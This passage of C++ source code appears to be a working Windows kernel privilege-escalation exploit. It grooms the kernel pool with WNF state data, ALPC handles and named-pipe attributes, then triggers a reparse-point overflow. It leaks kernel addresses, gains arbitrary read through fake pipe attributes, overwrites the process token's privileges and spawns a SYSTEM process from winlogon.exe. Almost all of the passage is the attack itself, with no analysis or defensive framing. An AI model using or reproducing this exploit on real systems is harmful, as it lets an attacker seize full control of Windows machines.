        state = NtCreateWnfStateName(&StateNames[i], WnfTemporaryStateName, WnfDataScopeUser, FALSE, NULL, WNF_MAXBUFSIZE, pSD);
        if (state != 0) {
            cout << "NtCreateWnfStateName failed! error=" << GetLastError() << endl;
            return -1;
        }
    }
    Sleep(1000);

    // Prepare ALPC Spray
    #define NUM_ALPC 0x800
    HANDLE ports[NUM_ALPC];
	CONST UINT portsCount = NUM_ALPC;

    printf("[+] Creating ALPC ports\n");
    bRet = CreateALPCPorts(ports, portsCount);
    if (!bRet) {
        printf("[!] CreateALPCPorts failed\n");
        return -1;
    }

    // Padding spray
    // Size is 0x1000-0x10 because _WNF_STATE_DATA header is 0x10
    printf("[+] Padding _WNF_STATE_DATA spray\n");
    for (int i = 0; i < NUM_WNDPADSPRAY; i++) {
        state = NtUpdateWnfStateData(&PadStateNames[i], StateData, (0x1000-0x10), 0, 0, 0, 0);
        if (state != 0) {
            cout << "NtUpdateWnfStateData failed! error=" << GetLastError() << endl;
            return -1;
        }
    }
    Sleep(1000);

    // Actual WNF Spray
    printf("[+] Spraying _WNF_STATE_DATA\n");
    for (int i = 0; i < NUM_WNFSTATEDATA; i++) {
        state = NtUpdateWnfStateData(&StateNames[i], StateData, (0x1000-0x10), 0, 0, 0, 0);
        if (state != 0) {
            cout << "NtUpdateWnfStateData failed! error=" << GetLastError() << endl;
            return -1;
        }
    }
    Sleep(1000);

    // Poke holes by freeing every alternate WNF object
    printf("[+] Poking holes by freeing every alternate WNF object\n");
    for (int i = 0; i < NUM_WNFSTATEDATA; i = i + 2) {
        NtDeleteWnfStateData(&StateNames[i], NULL);
        state = NtDeleteWnfStateName(&StateNames[i]);
        if (state != 0) {
            return -1;
        }
    }

    // TRIGGER VULNERABILITY
    // Open file 1 to trigger first overflow
    printf("[+] Opening file 1 to trigger vulnerability\n");
    hFile1 = 0;
    hFile1 = CreateFile(FullFileName1, GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile1 == INVALID_HANDLE_VALUE) {
        cout << "Open file failed! error=" << GetLastError() << endl;
        return -1;
    }
    printf("[+] File 1 handle: %d\n", hFile1); 

    // Spray ALPC Handles
    CONST ULONG poolAlHaSize = 0x1010; 
    CONST ULONG reservesCount = (poolAlHaSize / 2) / sizeof(ULONG_PTR) + 1;

    printf("[+] Allocating ALPC reserve handles\n");
    bRet = AllocateALPCReserveHandles(ports, portsCount, reservesCount - 1);
    if (!bRet) {
        printf("[!] CreateALPCPorts failed\n");
        return -1;
    }
    Sleep(1000);
    printf("[+] Waiting...\n"); 
    Sleep(5000);

    // Find corrupted WNF object
    WNF_CHANGE_STAMP stamp;
    char WNFOutput[0x2000];
    unsigned long WNFOutputSize = 0x1000;
    int CorruptedWNFidx = -1; 
    state = 0;
    printf("[+] Finding corrupted WNF_STATE_DATA object\n");
    for (int i = 1; i < NUM_WNFSTATEDATA; i = i + 2) {
        memset(WNFOutput, 0x0, sizeof(WNFOutput));
        WNFOutputSize = 0x1000; 
        state = NtQueryWnfStateData(&StateNames[i], NULL, NULL, &stamp, WNFOutput, &WNFOutputSize);
        printf("    idx: %d, stamp: 0x%lx, state: 0x%lx\n", i, stamp, state);
        if (stamp == 0xcafe) { 
            printf("[+] Found corrupted object idx: %d, stamp: 0x%lx, state: 0x%lx\n", i, stamp, state);
            CorruptedWNFidx = i;
            ALPC_leak = *((unsigned long long *)(WNFOutput + 0xff0));
            printf("[+] KALPC_RESERVE leak: 0x%llx\n", ALPC_leak);
            break;
        }
    }
    if (CorruptedWNFidx == -1 || ALPC_leak == 0) {
        printf("[!] Unable to find corrupted object\n");
        Sleep(100000); 
        return -1;
    }

    // Prepare second set of WNF sprays
    #define NUM_WNDPADSPRAYSECOND 0x400 
    #define NUM_WNFSTATEDATASECOND 0x450 
    WNF_STATE_NAME SecondPadStateNames[NUM_WNDPADSPRAYSECOND] = { 0 };
    WNF_STATE_NAME SecondStateNames[NUM_WNFSTATEDATASECOND] = { 0 };
    printf("[+] Prepare _WNF_STATE_DATA spray 2\n");
    for (int i = 0; i < NUM_WNDPADSPRAYSECOND; i++) { // Second padding spray
        state = NtCreateWnfStateName(&SecondPadStateNames[i], WnfTemporaryStateName, WnfDataScopeUser, FALSE, NULL, WNF_MAXBUFSIZE, pSD);
        if (state != 0) {
            cout << "NtCreateWnfStateName failed! error=" << GetLastError() << endl;
            return -1;
        }
    }
    for (int i = 0; i < NUM_WNFSTATEDATASECOND; i++) { // Second actual spray
        state = NtCreateWnfStateName(&SecondStateNames[i], WnfTemporaryStateName, WnfDataScopeUser, FALSE, NULL, WNF_MAXBUFSIZE, pSD);
        if (state != 0) {
            cout << "NtCreateWnfStateName failed! error=" << GetLastError() << endl;
            return -1;
        }
    }
    Sleep(1000);

    // Prepare second vulnerable object
    // Create exploit file 2 -- ChangeStamp 0xbeef
    HANDLE hFile2;
    CString FullFileName2 = L"c:\\windows\\temp\\test2";
    hFile2 = CreateFile(FullFileName2, GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile2 == INVALID_HANDLE_VALUE) {
        cout << "Open file failed! error=" << GetLastError() << endl;
        return -1;
    }
    printf("[+] Created exploit file 2: %d\n", hFile2);    

    // Change reparse point information of file
    memset(Bt4Buf, 0x0, sizeof(Bt4Buf));
    memset(Bt4Buf, 0x52, 0x1000); 
    *(unsigned int *)(Bt4Buf + 0x1000) = 0x00100904; // Header
    *(unsigned int *)(Bt4Buf + 0x1004) = 0xff8; // AllocatedSize
    *(unsigned int *)(Bt4Buf + 0x1008) = 0xff8; // DataSize
    *(unsigned int *)(Bt4Buf + 0x100c) = 0xbeef; // ChangeStamp
    BuildOverflow(hFile2, 0x1010, Bt4Buf);

    printf("[+] Closing file 2\n");
    CloseHandle(hFile2);
    Sleep(1000);

    // Prepare pipe_attribute spray
    #define NUM_PIPEATTR 0x450 
    HANDLE ReadPipeArr[NUM_PIPEATTR];
    HANDLE WritePipeArr[NUM_PIPEATTR];
    char PipeData[0x1000];
    char PipeOutput[0x1000];
    IO_STATUS_BLOCK status;

    memset(PipeData, 0x0, sizeof(PipeData));
    memset(PipeOutput, 0x0, sizeof(PipeOutput));
    memset(PipeData, 0x43, 0x20); 
    memset(PipeData+0x21, 0x43, 0x40);

    printf("[+] Creating pipe objects\n");
    for (int i = 0; i < NUM_PIPEATTR; i++) {
        ret = CreatePipe((PHANDLE)&ReadPipeArr[i], (PHANDLE)&WritePipeArr[i], NULL, 0x0);
        if (ret == 0) {
            cout << "CreatePipe failed! error=" << GetLastError() << endl;
            return -1;
        }
    }
    Sleep(1000); 

    // Claim handles so that Obtb doesn't get allocated while spraying later
    printf("[+] Spraying pipe_attribute to claim handles\n"); 
    for (int i = 0; i < NUM_PIPEATTR; i++) {
        ret = NtFsControlFile(WritePipeArr[i], NULL, NULL, NULL, &status, 0x11003c, PipeData, 0x200, PipeOutput, 0x100);
        if (ret != 0x0) {
            cout << "NtFsControlFile pipe attribute failed! error=" << GetLastError() << endl;
            return -1;
        }
    }
    Sleep(1000);

    // Spray second padding spray
    printf("[+] Second Padding WNF_STATE_DATA spray\n");
    memset(StateData, 0x42, sizeof(StateData));
    for (int i = 0; i < NUM_WNDPADSPRAYSECOND; i++) {
        // Size is 0x1000-0x10 because _WNF_STATE_DATA header is 0x10
        state = NtUpdateWnfStateData(&SecondPadStateNames[i], StateData, (0x1000-0x10), 0, 0, 0, 0);
        if (state != 0) {
            cout << "NtUpdateWnfStateData failed! error=" << GetLastError() << endl;
            return -1;
        }
    }
    Sleep(1000);

    // Spray second WNF_STATE_DATA spray
    // Actual WNF Spray
    printf("[+] Spraying second WNF_STATE_DATA spray\n");
    for (int i = 0; i < NUM_WNFSTATEDATASECOND; i++) {
        state = NtUpdateWnfStateData(&SecondStateNames[i], StateData, (0x1000-0x10), 0, 0, 0, 0);
        if (state != 0) {
            cout << "NtUpdateWnfStateData failed! error=" << GetLastError() << endl;
            return -1;
        }
    }
    Sleep(1000);

    // Poke holes by freeing every alternate WNF object
    printf("[+] Poking holes by freeing every alternate WNF object\n");
    for (int i = 0; i < NUM_WNFSTATEDATASECOND/2; i = i + 2) {
        NtDeleteWnfStateData(&SecondStateNames[i], NULL);
        state = NtDeleteWnfStateName(&SecondStateNames[i]);
        if (state != 0) {
            return -1;
        }
    }

    // Trigger second overflow
    printf("[+] Opening file 2 to trigger vulnerability\n");
    hFile2 = 0;
    hFile2 = CreateFile(FullFileName2, GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile2 == INVALID_HANDLE_VALUE) {
        cout << "Open file failed! error=" << GetLastError() << endl;
        return -1;
    }
    printf("[+] File 2 handle: %d\n", hFile2); 

    // Spray pipe_attribute to plug holes
    printf("[+] Spraying pipe_attribute\n"); 
    for (int i = 0; i < NUM_PIPEATTR; i++) {
        ret = NtFsControlFile(WritePipeArr[i], NULL, NULL, NULL, &status, 0x11003c, PipeData, (0x1000-0x30), PipeOutput, 0x100);
        if (ret != 0x0) {
            cout << "NtFsControlFile pipe attribute failed! error=" << GetLastError() << endl;
            return -1;
        }
    }
    Sleep(2000); 

    // Find second corrupted WNF object
    int CorruptedWNFidx2 = -1; 
    state = 0;

    printf("[+] Finding corrupted WNF_STATE_DATA object\n");
    for (int i = 1; i < NUM_WNFSTATEDATASECOND; i = i + 2) {
        memset(WNFOutput, 0x0, sizeof(WNFOutput));
        WNFOutputSize = 0x1000; 
        state = NtQueryWnfStateData(&SecondStateNames[i], NULL, NULL, &stamp, WNFOutput, &WNFOutputSize);
        printf("    idx: %d, stamp: 0x%lx, state: 0x%lx\n", i, stamp, state);
        if (stamp == 0xbeef) { 
            printf("[+] Found corrupted object idx: %d, stamp: 0x%lx, state: 0x%lx\n", i, stamp, state);
            CorruptedWNFidx2 = i;
            pipe_leak = *((unsigned long long *)(WNFOutput + 0xff0));
            printf("[+] Pipe leak: 0x%llx\n", pipe_leak);
            break;
        }
    }
    if (CorruptedWNFidx2 == -1 || pipe_leak == 0) {
        printf("[!] Unable to find corrupted object\n");
        Sleep(100000); 
        return -1;
    }

    // STAGE 2: ARBITRARY READ
    printf("[+] STAGE 2: ARBITRARY READ\n");

    // Set up fake pipe_attr objects 
    printf("[+] Setting up fake pipe_attribute objects in userland\n");
    char FakePipe[0x1000]; 
    char FakePipe2[0x1000];
    char FakePipe3[0x1000];
    char FakePipeName[] = "fakepipe\00";
    char FakePipeName2[] = "aaa\00";
    memset(FakePipe, 0x0, sizeof(FakePipe));
    memset(FakePipe2, 0x0, sizeof(FakePipe2)); 
    memset(FakePipe3, 0x0, sizeof(FakePipe3));
    memset(PipeOutput, 0x0, sizeof(PipeOutput)); // To read from pipe_attribute, buffer size is 0x1000

    // Set up fake userland pipe_attribute object -- ARBITRARY READ
    *(unsigned long long *)(FakePipe) = (unsigned long long)FakePipe2; // Flink
    *(unsigned long long *)(FakePipe + 0x8) =  (unsigned long long)pipe_leak; // Blink
    *(unsigned long long *)(FakePipe + 0x10) = (unsigned long long)FakePipeName; // Attribute name
    *(unsigned long long *)(FakePipe + 0x18) = 0x30; // Attribute value size -- LEAK SIZE
    *(unsigned long long *)(FakePipe + 0x20) = (unsigned long long)ALPC_leak; // Attribute value -- LEAK POINTER
    *(unsigned long long *)(FakePipe + 0x28) = 0x4545454545454545; // Data

    // Set up second fake userland pipe_attribute object 
    *(unsigned long long *)(FakePipe2) = 0x5a5a5a5a5a5a5a5a; // Flink
    *(unsigned long long *)(FakePipe2 + 0x8) =  (unsigned long long)FakePipe; // Blink
    *(unsigned long long *)(FakePipe2 + 0x10) = (unsigned long long)FakePipeName2; // Attribute name
    *(unsigned long long *)(FakePipe2 + 0x18) = 0x30; // Attribute value size 
    *(unsigned long long *)(FakePipe2 + 0x20) = (unsigned long long)ALPC_leak; // Attribute value 
    *(unsigned long long *)(FakePipe2 + 0x28) = 0x4646464646464646; // Data

    printf("[+] Address of fake pipe_attr 1: 0x%llx\n", (unsigned long long)FakePipe); 
    printf("[+] Address of fake pipe_attr 2: 0x%llx\n", (unsigned long long)FakePipe2); 

    // Using WNF object 1 to overwrite flink of pipe_attribute
    printf("[+] Using WNF object 1 to corrupt pipe_attribute\n");
    memset(StateData, 0x0, sizeof(StateData)); 
    memset(StateData, 0x47, 0x200); // Just so that it is easier to see the object
    *(unsigned long long *)(StateData + 0xff0) = (unsigned long long)FakePipe;
    state = NtUpdateWnfStateData(&SecondStateNames[CorruptedWNFidx2], StateData, 0xff8, NULL, NULL, 0xbeef, NULL); 

    // Leak from the corrupted pipe_attribute object to read from KALPC_RESERVE
    printf("[+] Arbitrary read from corrupted pipe_attribute object\n"); 
    int CorruptedPipeIdx = -1;
    for (int i = 0; i < NUM_PIPEATTR; i++) {
        memset(PipeData, 0x0, sizeof(PipeData)); 
        ret = NtFsControlFile(WritePipeArr[i], NULL, NULL, NULL, &status, 0x110038, FakePipeName, (strlen(FakePipeName)+1), PipeData, 0x1000);
        if (ret == 0) {
            printf("[+] Reached fake pipe_attribute in userland\n");
            ALPC_port_leak = *((unsigned long long *)(PipeData));
            ALPC_handle_table = ((unsigned long long *)(PipeData))[1];
            ALPC_message_leak = ((unsigned long long *)(PipeData))[3]; 
            CorruptedPipeIdx = i; 
            printf("[+] ALPC port leak: 0x%llx\n", ALPC_port_leak);
            printf("[+] ALPC handle table leak: 0x%llx\n", ALPC_handle_table); 
            printf("[+] ALPC message leak: 0x%llx\n", ALPC_message_leak);
            break;
        }
    }
    if (CorruptedPipeIdx == -1 || ALPC_port_leak == 0 || ALPC_message_leak == 0) {
        printf("[!] ALPC_port leak failed\n"); 
        return -1;
    }

    // Leak EPROCESS (which is ALPC_port_leak + 0x18, EPROCESS is 0xa40 in size)
    printf("[+] Leaking data in ALPC_port\n"); 
    memset(PipeData, 0x0, sizeof(PipeData)); 
    *(unsigned long long *)(FakePipe + 0x18) = 0x1d8; // Attribute value size -- LEAK SIZE
    *(unsigned long long *)(FakePipe + 0x20) = (unsigned long long)(ALPC_port_leak); // Attribute value -- LEAK POINTER
    ret = NtFsControlFile(WritePipeArr[CorruptedPipeIdx], NULL, NULL, NULL, &status, 0x110038, FakePipeName, (strlen(FakePipeName)+1), PipeData, 0x1000);
    EPROCESS_leak = ((unsigned long long *)(PipeData))[3];
    printf("[+] EPROCESS leak: 0x%llx\n", EPROCESS_leak); 

    // Leak token
    int pid = GetCurrentProcessId(); 
    printf("[+] Current PID: 0x%lx\n", pid); 
    memset(PipeData, 0x0, sizeof(PipeData)); 
    *(unsigned long long *)(FakePipe + 0x18) = 0xa40; // Attribute value size -- LEAK SIZE
    *(unsigned long long *)(FakePipe + 0x20) = (unsigned long long)(EPROCESS_leak); // Attribute value -- LEAK POINTER
    ret = NtFsControlFile(WritePipeArr[CorruptedPipeIdx], NULL, NULL, NULL, &status, 0x110038, FakePipeName, (strlen(FakePipeName)+1), PipeData, 0x1000);
    token_leak = ((unsigned long long *)(PipeData))[151] & 0xFFFFFFFFFFFFFFF0; 
    printf("[+] Leaked PID: 0x%lx\n", ((unsigned long long *)(PipeData))[136]); 
    printf("[+] Leaked token: 0x%llx\n", token_leak);

    // Leak stuff inside ALPC_message
    printf("[+] Leaking data in ALPC_message\n"); 
    memset(PipeData, 0x0, sizeof(PipeData)); 
    *(unsigned long long *)(FakePipe + 0x18) = 0x118; // Attribute value size -- LEAK SIZE
    *(unsigned long long *)(FakePipe + 0x20) = (unsigned long long)(ALPC_message_leak); // Attribute value -- LEAK POINTER
    ret = NtFsControlFile(WritePipeArr[CorruptedPipeIdx], NULL, NULL, NULL, &status, 0x110038, FakePipeName, (strlen(FakePipeName)+1), PipeData, 0x1000);

    // STAGE 3: PWN TIME
    printf("STAGE 3: PWN TIME\n"); 

    BYTE* fakeKalpcReserveObject = (BYTE*)calloc(1, sizeof(KALPC_RESERVE) + 0x20);
    BYTE* fakeKalpcMessageObject = (BYTE*)calloc(1, sizeof(KALPC_MESSAGE) + 0x20);
    KALPC_RESERVE* fakeKalpcReserve = (KALPC_RESERVE*)(fakeKalpcReserveObject + 0x20);
    KALPC_MESSAGE* fakeKalpcMessage = (KALPC_MESSAGE*)(fakeKalpcMessageObject + 0x20);

    memset(fakeKalpcReserveObject, 0, sizeof(KALPC_RESERVE) + 0x20);
    memset(fakeKalpcMessageObject, 0, sizeof(KALPC_MESSAGE) + 0x20);
    fakeKalpcReserveObject[1] = 0x7;
    fakeKalpcReserveObject[8] = 0x1;
    fakeKalpcMessageObject[8] = 0x1;

    fakeKalpcReserve->Size = 0x28;
    fakeKalpcReserve->Message = fakeKalpcMessage;

    fakeKalpcMessage->Reserve = fakeKalpcReserve;
    fakeKalpcMessage->ExtensionBuffer = (BYTE*)token_leak + 0x40;
    fakeKalpcMessage->ExtensionBufferSize = 0x10;

    // Use corrupted WNF object 1 to overwrite KALPC_RESERVE in handle table
    printf("[+] Using WNF object 1 to overwrite KALPC_RESERVE\n");
    memset(StateData, 0x0, sizeof(StateData)); 
    memset(StateData, 0x48, 0x200); // Just so that it is easier to see the object
    *(unsigned long long *)(StateData + 0xff0) = (unsigned long long)fakeKalpcReserve;
    state = NtUpdateWnfStateData(&StateNames[CorruptedWNFidx], StateData, 0xff8, NULL, NULL, 0xcafe, NULL); 

    printf("[+] Overwriting token privs\n"); 
    ULONG DataLength = 0x10;
	ALPC_MESSAGE* alpcMessage = (ALPC_MESSAGE*)calloc(1, sizeof(ALPC_MESSAGE));
    memset(alpcMessage, 0, sizeof(ALPC_MESSAGE));
    alpcMessage->PortHeader.u1.s1.DataLength = DataLength;
    alpcMessage->PortHeader.u1.s1.TotalLength = sizeof(PORT_MESSAGE) + DataLength;
    alpcMessage->PortHeader.MessageId = (ULONG)g_hResource;
	ULONG_PTR* pAlpcMsgData = (ULONG_PTR*)((BYTE*)alpcMessage + sizeof(PORT_MESSAGE));
    pAlpcMsgData[0] = 0xffffffffffffffff;
    pAlpcMsgData[1] = 0xffffffffffffffff;

    for (int i = 0; i < portsCount; i++) {
        ret = NtAlpcSendWaitReceivePort(ports[i], ALPC_MSGFLG_NONE, (PPORT_MESSAGE)alpcMessage, NULL, NULL, NULL, NULL, NULL);
    }

    // Find PID of winlogon
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    HANDLE winlogon_process = 0; 

    if (Process32First(snapshot, &entry) == TRUE) {
        while (Process32Next(snapshot, &entry) == TRUE) {
            if (wcscmp(entry.szExeFile, L"winlogon.exe") == 0) {  
                winlogon_process = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, entry.th32ProcessID);
                printf("[+] Found winlogon: 0x%lx\n", winlogon_process); 
            }
        }
    }

    // SHELLZ 
    printf("[+] SHELLZ\n");
    CreateProcessFromHandle(winlogon_process);

    printf("[+] Done\n");

    Sleep(100000);
    return 0;
}